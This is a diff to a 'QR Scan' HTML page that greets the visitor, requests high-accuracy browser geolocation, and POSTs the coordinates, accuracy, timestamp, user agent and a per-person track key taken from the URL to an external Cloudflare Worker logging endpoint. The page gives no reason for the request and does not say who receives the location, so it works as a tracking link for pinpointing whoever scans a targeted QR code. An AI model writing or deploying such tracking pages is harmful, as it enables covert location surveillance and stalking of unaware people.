@@ -3,30 +3,61 @@
 <head>
   <meta charset="utf-8">
   <title>QR Scan</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 50px;
+    }
+    p {
+      font-size: 20px;
+      margin-bottom: 20px;
+    }
+  </style>
 </head>
 <body>
-<script>
-  // extract track key from URL
-  const trackKey = new URLSearchParams(window.location.search).get('u') || 'unknown';
-  const LOG_ENDPOINT = 'https://qr-tracker-worker.businesstroffice.workers.dev/log'; // Cloudflare Worker URL
+  <p>Hello, how are you?</p>
+  <p id="status">Requesting location...</p>
 
-  // request location
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(pos => {
-      fetch(LOG_ENDPOINT, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          track_key: trackKey,
-          timestamp: new Date().toISOString(),
-          latitude: pos.coords.latitude,
-          longitude: pos.coords.longitude,
-          accuracy_m: pos.coords.accuracy,
-          user_agent: navigator.userAgent,
-        })
-      }).catch(console.error);
-    }, console.warn, { enableHighAccuracy: true });
-  }
-</script>
+  <script>
+    // Extract track key from URL query ?u=
+    const trackKey = new URLSearchParams(window.location.search).get('u') || 'unknown';
+
+    // Worker endpoint
+    const LOG_ENDPOINT = 'https://qr-tracker-worker.businesstroffice.workers.dev/log';
+
+    // Ask for location permission
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          document.getElementById('status').textContent = 'Location sent successfully!';
+
+          // Send location to Worker
+          fetch(LOG_ENDPOINT, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              track_key: trackKey,
+              timestamp: new Date().toISOString(),
+              latitude: pos.coords.latitude,
+              longitude: pos.coords.longitude,
+              accuracy_m: pos.coords.accuracy,
+              user_agent: navigator.userAgent
+            })
+          }).catch(err => {
+            console.error('Error sending location:', err);
+            document.getElementById('status').textContent = 'Failed to send location';
+          });
+        },
+        err => {
+          console.warn('Geolocation error:', err);
+          document.getElementById('status').textContent = 'Location permission denied';
+        },
+        { enableHighAccuracy: true }
+      );
+    } else {
+      document.getElementById('status').textContent = 'Geolocation not supported';
+    }
+  </script>
 </body>
 </html>
